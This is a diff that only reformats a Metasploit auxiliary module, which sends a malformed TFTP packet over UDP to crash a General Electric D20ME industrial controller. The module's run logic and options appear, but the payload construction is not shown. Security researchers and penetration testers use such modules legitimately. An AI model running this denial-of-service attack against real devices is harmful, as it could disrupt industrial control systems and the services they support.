@@ -12,49 +12,49 @@
 # exploitable.
 ##
 
-
-
 class MetasploitModule < Msf::Auxiliary
   include Rex::Ui::Text
   include Rex::Proto::TFTP
   include Msf::Exploit::Remote::Udp
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'General Electric D20ME TFTP Server Buffer Overflow DoS',
-      'Description'    => %q{
-        By sending a malformed TFTP request to the GE D20ME, it is possible to crash the
-        device.
+    super(
+      update_info(
+        info,
+        'Name' => 'General Electric D20ME TFTP Server Buffer Overflow DoS',
+        'Description' => %q{
+          By sending a malformed TFTP request to the GE D20ME, it is possible to crash the
+          device.
 
-        This module is based on the original 'd20ftpbo.rb' Basecamp module from
-        DigitalBond.
+          This module is based on the original 'd20ftpbo.rb' Basecamp module from
+          DigitalBond.
         },
-      'Author'         =>
-        [
+        'Author' => [
           'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
           'todb' # Metasploit fixups
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
         ],
-      'DisclosureDate' => '2012-01-19'
-      ))
+        'DisclosureDate' => '2012-01-19'
+      )
+    )
 
     register_options(
       [
         OptAddressLocal.new('LHOST', [false, "The local IP address to bind to"]),
         OptInt.new('RECV_TIMEOUT', [false, "Time (in seconds) to wait between packets", 3]),
         Opt::RPORT(69)
-      ])
+      ]
+    )
   end
 
   def run
     udp_sock = Rex::Socket::Udp.create(
       'LocalHost' => datastore['LHOST'] || nil,
-      'PeerHost'  => rhost,
+      'PeerHost' => rhost,
       'PeerPort' => rport,
-      'Context' => {'Msf' => framework, 'MsfExploit' => self}
+      'Context' => { 'Msf' => framework, 'MsfExploit' => self }
     ) # No need to rescue, it's a UDP faux-socket
     udp_sock.sendto(payload, rhost, rport)
     recv = udp_sock.timed_read(65535, recv_timeout)
